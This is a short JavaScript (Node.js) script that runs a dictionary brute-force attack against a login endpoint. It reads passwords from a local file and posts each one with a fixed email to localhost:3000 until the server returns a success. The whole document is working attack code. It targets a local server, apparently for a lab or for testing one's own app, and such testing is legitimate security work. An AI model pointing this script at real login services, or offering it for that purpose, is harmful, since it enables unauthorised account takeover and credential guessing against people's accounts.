var fs = require("fs");

passwordDictionary = fs.readFileSync("./passwords.txt").toString('utf-8').split(/\r?\n/);

const email = "email@address.com"

async function main() {

  for (password in passwordDictionary) {

    const passwordToCheck = passwordDictionary[password];

    try {
      const response = await fetch("http://localhost:3000/users/login", {
        method: "POST",
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          "userEmail": email,
          "userPassword": passwordToCheck
        })
      });

      if (response.status === 200) {
        console.log(`[SUCCESS] gained access to account '${email}' with password '${passwordToCheck}' (Attempt: ${password})`);
        break; // Password found
      } else {
        console.log(`[FAIL] Attempt with password: '${passwordToCheck}' failed.`);
      }
    } catch (error) {
      console.error("Error occurred:", error);
    }
  }

}

main();

